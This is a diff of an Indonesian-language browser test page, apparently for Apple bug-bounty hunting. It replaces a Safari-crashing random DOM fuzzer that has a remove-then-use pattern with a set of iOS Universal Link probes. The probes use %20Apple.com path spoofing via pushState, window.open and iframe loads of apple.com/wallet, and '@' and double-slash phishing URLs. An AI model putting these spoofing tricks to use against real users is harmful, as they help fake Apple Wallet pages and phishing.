@@ -1,90 +1,179 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>TEST 5: RANDOM DOM 200x - PALING GANAS</title>
-<style>body{font-family:-apple-system;padding:12px;background:#000;color:#ff0} button{width:100%;padding:16px;background:#ff0;color:#000;border:none;border-radius:12px;font-weight:900;font-size:15px} pre{background:#111;color:#0f0;padding:10px;border-radius:8px;font-size:9px;min-height:200px;white-space:pre-wrap;word-break:break-all;border:1px solid #ff0}</style>
+<title>Universal Link 0-DAY - iPhone Only</title>
+<style>
+body{font-family:-【entity-apple¦canonical_name=Apple】-system;padding:14px;background:#000;color:#fff}
+.card{background:#1c1c1e;padding:14px;border-radius:12px;margin:14px 0;border:1px solid #333}
+a{display:block;padding:14px;background:#0a84ff;color:#fff;text-decoration:none;border-radius:10px;margin:8px 0;font-weight:700;text-align:center}
+button{width:100%;padding:14px;background:#fff;color:#000;border:none;border-radius:10px;font-weight:800;margin:6px 0}
+pre{background:#000;color:#0f0;padding:10px;border-radius:8px;font-size:11px;min-height:90px;white-space:pre-wrap;border:1px solid #222}
+.small{font-size:11px;color:#8e8e93}
+.badge{display:inline-block;background:#ff3b30;color:#fff;padding:2px 6px;border-radius:4px;font-size:10px}
+</style>
 </head>
 <body>
-<h3 style="color:#ff0">TEST 5: RANDOM DOM 200x - PALING GANAS DoS!</h3>
-<p style="font-size:10px;color:#888">Bisa crash WebContent! Kalau crash "A problem repeatedly occurred" = DoS $1k!</p>
-<button onclick="fuzzRandom()">FUZZ RANDOM DOM 200x - CRASH TEST!</button>
-<pre id="c5">Belum test - WARNING: Bisa bikin Safari crash dan reload!</pre>
-<div id="arena"></div>
+<h3 style="color:#0af">🔗 UNIVERSAL LINK 0-DAY HUNT - iPhone</h3>
+<p class="small">Test di iPhone iOS 26.4.1 Safari. Bukan di Mac! Screenshot lu yang 【entity-Apple¦canonical_name=Apple】 Wallet 4,5 rating itu = Universal Link NORMAL.</p>
+
+<!-- TEST 1 -->
+<div class="card">
+<h4>TEST 1: Normal Universal Link <span class="badge">CONTROL</span></h4>
+<p class="small">Ini harusnya buka App (kalau work = Universal Link aktif di iPhone lu)</p>
+<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">youtube.com - Harusnya buka YouTube App</a>
+<a href="https://apple.com">【entity-apple¦canonical_name=Apple】.com - Harusnya buka App Store / 【entity-Apple¦canonical_name=Apple】 Store App</a>
+<pre id="log1">Klik link di atas. 
+- Kalau YouTube buka App = Universal Link ON
+- Kalau tetap di Safari = Universal Link OFF (cek Settings > Apps > YouTube > Open links)
+</pre>
+</div>
+
+<!-- TEST 2 - INI YANG PENTING, VARIAN DARI %20Apple.com VALID LU! -->
+<div class="card">
+<h4>TEST 2: %20 Trick + Universal Link HIJACK <span class="badge" style="background:#30d158">0-DAY CANDIDATE!</span></h4>
+<p class="small">Varian dari bug VALID lu: https://0x403for.github.io/%20Apple.com/</p>
+<a href="https://0x403for.github.io/%20Apple.com/wallet">0x403for.github.io/%20Apple.com/wallet</a>
+<a href="https://0x403for.github.io/%20Apple.com/apple-pay">0x403for.github.io/%20Apple.com/【entity-apple¦canonical_name=Apple】-pay</a>
+<a href="https://0x403for.github.io/ 【entity-Apple¦canonical_name=Apple】.com/wallet">0x403for.github.io/ Apple.com/wallet (space asli, bukan %20)</a>
+<button onclick="testHijack()">TEST HIJACK: Apakah %20Apple.com bisa trigger Wallet App?</button>
+<pre id="log2">Belum test.
+
+TEORI HIJACK:
+Kalau https://0x403for.github.io/%20Apple.com/wallet 
+bisa trigger Apple Wallet App kayak screenshot lu yang "Buka" biru = HIJACK VALID!
+
+Artinya iOS kira path "/%20Apple.com/wallet" itu bagian dari apple.com, padahal host-nya 0x403for.github.io!
+
+Kalau cuma buka Safari dengan URL /%20Apple.com/wallet = itu varian dari SPOOF VALID lu kemarin (bukan universal link hijack, tapi tetap SPOOF!)
+</pre>
+</div>
+
+<!-- TEST 3 -->
+<div class="card">
+<h4>TEST 3: Universal Link BYPASS via window.open / iframe <span class="badge" style="background:#ff9f0a">BYPASS</span></h4>
+<p class="small">Harusnya buka App, tapi kalau malah tetap di Safari = BYPASS bisa buat spoof!</p>
+<button onclick="testBypassOpen()">window.open('https://apple.com/wallet') dari 0x403for</button>
+<button onclick="testBypassIframe()">iframe src='https://apple.com/wallet' di dalam 0x403for</button>
+<pre id="log3">Belum test.
+
+TEORI BYPASS:
+Klik window.open('https://apple.com/wallet') dari halaman 0x403for.github.io
+
+- Expected: harusnya buka Wallet App (kayak screenshot lu)
+- Bug: kalau tetap di Safari tab baru dengan URL apple.com tapi masih di konteks 0x403for = BYPASS!
+
+Attacker bisa bikin https://apple.com/wallet palsu di dalam iframe 0x403for!
+
+Cek apakah iframe bisa load 【entity-apple¦canonical_name=Apple】.com/wallet atau di-block X-Frame-Options?
+</pre>
+<div id="iframeContainer"></div>
+</div>
+
+<!-- TEST 4 -->
+<div class="card">
+<h4>TEST 4: AASA Path Confusion + Open Redirect</h4>
+<p class="small">AASA file apple.com punya paths: /wallet, /apple-pay, dll. Bisa di-bypass pakai // atau /%2e atau /@ ?</p>
+<a href="https://apple.com//wallet">https://apple.com//wallet (double slash)</a>
+<a href="https://apple.com/%2e/wallet">https://apple.com/%2e/wallet (dot encoded)</a>
+<a href="https://apple.com/@0x403for.github.io/wallet">https://apple.com/@0x403for.github.io/wallet (user @ trick)</a>
+<a href="https://0x403for.github.io@apple.com/wallet">https://0x403for.github.io@apple.com/wallet (phishing klasik)</a>
+<button onclick="testAASA()">FETCH AASA FILE APPLE.COM</button>
+<pre id="log4">Belum test. AASA file di https://apple.com/.well-known/apple-app-site-association
+
+Kalau path /%2e/wallet atau //@ bisa bypass AASA = bisa bikin universal link yang gak seharusnya jadi universal link = BYPASS!
+</pre>
+</div>
+
+<!-- TEST 5 - KOMBINASI DENGAN BUG VALID LU! -->
+<div class="card" style="border:1px solid #0af">
+<h4>TEST 5: FINAL COMBO - %20 + ViewTransition + Universal Link <span class="badge">FINAL ULTIMATE</span></h4>
+<p class="small">Gabungin 0-day VALID lu (%20Apple.com) + Universal Link!</p>
+<button onclick="testFinal()" style="background:#0af;color:#fff">TRIGGER FINAL ULTIMATE UNIVERSAL SPOOF</button>
+<pre id="log5">Belum test
+
+Ini gabungan:
+1. history.pushState /%20Apple.com/wallet (bug VALID lu!)
+2. + startViewTransition (bug VALID lu!)
+3. + coba trigger universal link
+
+Kalau setelah pushState ke /%20Apple.com/wallet, terus lu klik link https://apple.com/wallet dan iOS malah stay di 0x403for = ULTIMATE BYPASS!
+</pre>
+</div>
+
 <script>
-let crash=0;
-function log(m){
- let el=document.getElementById('c5');
- el.innerText+=m+"\n";
- el.scrollTop=el.scrollHeight;
+function testHijack(){
+ let el=document.getElementById('log2');
+ el.innerText=`Current: ${location.href}\n`;
+ history.pushState({},'', '/%20Apple.com/wallet-hijack-test');
+ el.innerText+=`After pushState: ${location.pathname}\nDecoded: ${decodeURIComponent(location.pathname)}\n\n`;
+ el.innerText+=`Sekarang klik link di atas yang /%20Apple.com/wallet\nLihat apakah buka Wallet App (kayak screenshot "Buka" biru lu) atau cuma Safari?\n\n`;
+ el.innerText+=`Kalau buka Wallet App = HIJACK 0-DAY! Laporkan!\n`;
+ el.innerText+=`Kalau tetap Safari tapi URL /%20Apple.com/wallet = SPOOF varian dari bug VALID lu kemarin!\n`;
 }
-async function fuzzRandom(){
- let el=document.getElementById('c5');
- el.innerText="Starting RANDOM DOM 200x - GANAS!\nHP bisa lag!\n";
- let arena=document.getElementById('arena');
- let tags=['model','search','canvas','div','dialog','details','video','audio','select','input','popover','img'];
- 
- for(let i=0;i<200;i++){
-  try{
-   let parent=document.createElement('div');
-   parent.style.display='contents';
-   
-   // Random 1-3 children
-   let childCount=1+Math.floor(Math.random()*3);
-   for(let j=0;j<childCount;j++){
-    let tag=tags[Math.floor(Math.random()*tags.length)];
-    let child=document.createElement(tag);
-    
-    // Setup by tag
-    if(tag==='canvas'){
-     let ctx=child.getContext('2d');
-     ctx.fillStyle=`hsl(${i*2},100%,50%)`;
-     ctx.fillRect(0,0,20,20);
-     try{ let bmp=child.transferToImageBitmap?.(); if(bmp) bmp.close(); }catch(e){}
-    }
-    if(tag==='model' || tag==='search' || tag==='dialog'){
-     child.setAttribute('popover','');
-     child.innerHTML='<span>test</span>';
-     try{ child.showPopover?.(); }catch(e){}
-     child.addEventListener('beforetoggle', ()=>{
-      try{ parent.remove(); }catch(e){}
-     });
-    }
-    if(tag==='video'){ child.src='data:video/mp4;base64,'; }
-    if(tag==='img'){ child.src='data:image/gif;base64,[STRIPPED]'; }
-    
-    child.style.filter=`blur(${Math.random()*5}px)`;
-    child.style.transform='translateZ(0)';
-    parent.appendChild(child);
-    
-    // UAF pattern: remove + use
-    if(Math.random()>0.5){
-     parent.remove();
-     try{ child.innerHTML='uaf?'+i; child.style.filter='none'; }catch(e){}
-    }
-   }
-   
-   arena.appendChild(parent);
-   if(i%2===0) parent.remove();
-   
-   if(i%20===0){
-    log(`Iter ${i}/200 - arena childs: ${arena.childNodes.length}`);
-    await new Promise(r=>setTimeout(r,1));
-    if(i%40===0) arena.innerHTML='';
-   }
-   
-  }catch(e){
-   crash++;
-   log(`Iter ${i} exception: ${e.message} crash=${crash}`);
-   if(crash>10){ log('STOP: too many errors!'); break; }
-  }
+
+function testBypassOpen(){
+ let el=document.getElementById('log3');
+ el.innerText=`Calling window.open('https://apple.com/wallet')...\n`;
+ let win=window.open('https://apple.com/wallet','_blank');
+ el.innerText+=`Window opened. Perhatikan: Apakah buka Wallet App (screenshot Buka) atau Safari tab baru?\n`;
+ el.innerText+=`Kalau buka Safari tab baru = BYPASS! Seharusnya buka App!\n`;
+ el.innerText+=`Tutup tab baru setelah 5 detik...\n`;
+ setTimeout(()=>{ try{win.close(); el.innerText+=`Closed\n`;}catch(e){} },5000);
+}
+
+function testBypassIframe(){
+ let el=document.getElementById('log3');
+ let container=document.getElementById('iframeContainer');
+ container.innerHTML='';
+ let iframe=document.createElement('iframe');
+ iframe.src='https://apple.com/wallet';
+ iframe.style.width='100%'; iframe.style.height='400px'; iframe.style.border='3px solid red'; iframe.style.borderRadius='10px';
+ container.appendChild(iframe);
+ el.innerText+=`\nIframe created src=https://apple.com/wallet\n`;
+ el.innerText+=`Kalau bisa load konten 【entity-apple¦canonical_name=Apple】.com/wallet di dalam 0x403for = X-Frame bypass + bisa universal link bypass!\n`;
+ el.innerText+=`Kalau blocked (putih / error) = SAFE (X-Frame-Options DENY) = expected!\n`;
+ iframe.onload=()=>{ el.innerText+=`Iframe onload fired! Coba cek isinya!\n`; };
+ iframe.onerror=()=>{ el.innerText+=`Iframe onerror - blocked!\n`; };
+}
+
+async function testAASA(){
+ let el=document.getElementById('log4');
+ el.innerText=`Fetching AASA...\n`;
+ try{
+  let res=await fetch('https://apple.com/.well-known/apple-app-site-association');
+  let txt=await res.text();
+  el.innerText+=`Status: ${res.status}, Length: ${txt.length}\n`;
+  el.innerText+=`First 300: ${txt.substring(0,300)}\n\n`;
+  el.innerText+=`Cari "wallet" di AASA: ${txt.includes('wallet')?'ADA':'GAK ADA'}\n`;
+ }catch(e){ el.innerText+=`Fetch error (CORS): ${e.message}\nCoba buka langsung di Safari: https://apple.com/.well-known/apple-app-site-association\n`; }
+}
+
+function testFinal(){
+ let el=document.getElementById('log5');
+ el.innerText=`FINAL TEST: ViewTransition + %20 + Universal Link\n`;
+ if(document.startViewTransition){
+  document.startViewTransition(()=>{
+   history.pushState({},'', '/%20Apple.com/wallet-final');
+   el.innerText+=`Pushed to /%20Apple.com/wallet-final via ViewTransition\n`;
+   el.innerText+=`Now URL = ${location.pathname}\n`;
+   el.innerText+=`Coba klik https://apple.com/wallet - apakah masih buka App atau kebawa jadi /%20Apple.com?\n`;
+  });
+ }else{
+  history.pushState({},'', '/%20Apple.com/wallet-final');
+  el.innerText+=`Pushed to /%20Apple.com/wallet-final (no ViewTransition)\n`;
  }
- arena.innerHTML='';
- log(`DONE 200x! crashCount=${crash}`);
- log('If no crash popup "A problem occurred" = SAFE! iOS 26.4.1 aman!');
- log('If crash = screenshot! Report DoS ke Apple!');
 }
 </script>
+
+<div class="card" style="background:#111;font-size:11px">
+<b>Apa yang harus lu screenshot buat bounty 【entity-Apple¦canonical_name=Apple】?</b><br>
+- Video screen recording kayak video TEST 5 lu kemarin (12% baterai itu!)<br>
+- Klik link /%20Apple.com/wallet - kalau buka Wallet App kayak screenshot lu yang rating 4,5 + tombol Buka biru = HIJACK!<br>
+- Atau klik window.open apple.com/wallet - kalau tetap di Safari = BYPASS!<br>
+<b>Bounty Universal Link:</b> $3k-$10k karena bisa redirect user ke fake Wallet!
+</div>
+
 </body>
 </html>
